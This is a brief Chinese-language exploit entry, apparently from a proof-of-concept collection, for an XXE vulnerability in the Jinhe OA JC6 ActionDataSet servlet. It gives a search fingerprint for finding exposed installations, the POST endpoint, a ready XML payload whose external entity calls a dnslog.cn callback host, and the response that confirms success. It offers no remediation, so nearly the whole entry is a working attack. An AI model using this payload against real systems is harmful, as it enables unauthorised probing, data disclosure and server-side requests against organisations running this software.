# 金和JC6ActionDataSet存在XXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /jc6/servlet/ActionDataSet HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://323232323.xxxx.dnslog.cn"> %remote;]>
```
- **响应特征**：200 Dnslog回显